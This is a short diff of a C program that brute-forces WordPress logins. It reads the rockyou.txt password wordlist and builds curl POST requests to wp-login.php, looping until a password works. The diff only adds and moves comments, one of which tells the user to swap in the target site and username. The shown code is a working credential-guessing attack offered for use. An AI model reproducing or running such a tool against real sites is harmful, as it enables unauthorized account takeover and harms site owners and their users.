@@ -23,9 +23,9 @@ void reportTime(const char *msg) {
 }
 
 int main(void) {
-    FILE *fin = fopen("/usr/share/wordlists/rockyou.txt", "r");
+    FILE *fin = fopen("/usr/share/wordlists/rockyou.txt", "r"); // load wordlist
+    // create HTTP request template. At least "example.com" and "USERNAME" must be changed according to the specific website
     char *req[2] = {"curl 'http://example.com/wp-login.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://example.com' -H 'Connection: keep-alive' -H 'Referer: http://example.com/wp-login.php' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'log=USERNAME&pwd=", "&wp-submit=Log+In&redirect_to=http%3A%2F%2Fexample.com%2Fwp-admin%2F&testcookie=1'"};
-    // at least "example.com" and "USERNAME" must be changed in the strings above, according to the specific website
 
     bool found = 0;
     while (!found) {
